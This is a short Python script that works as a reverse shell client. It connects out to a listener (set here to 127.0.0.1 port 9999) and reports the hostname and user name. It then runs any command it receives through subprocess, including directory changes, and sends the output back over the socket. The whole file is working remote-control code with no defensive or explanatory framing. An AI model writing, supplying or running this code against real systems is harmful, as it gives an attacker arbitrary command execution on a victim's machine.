
import subprocess
import os
import socket
import getpass

def CNX():
    ip = '127.0.0.1'
    port = 9999
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))


    hostname = socket.gethostname()
    user = getpass.getuser()
    
    s.send(f'Hello from {hostname} as {user}.\n'.encode())
    
    while True:
        
        command = s.recv(1024).decode()
        
        try:
            
            if command.split(" ")[0] == 'cd':
                path = command.split(" ")[1]
                os.chdir(path)
                curdir = os.getcwd()
                s.send(f'{curdir}'.encode())
            else:
                
                output = subprocess.run(command.split(" "), capture_output=True)
                if (len(output.stdout)==0):
                    s.send(b"OK")
                    continue
                s.send(output.stdout)
        except Exception as e:
            s.send(b"No such command...i guess")
            continue

    return 

if __name__ == '__main__':
    CNX()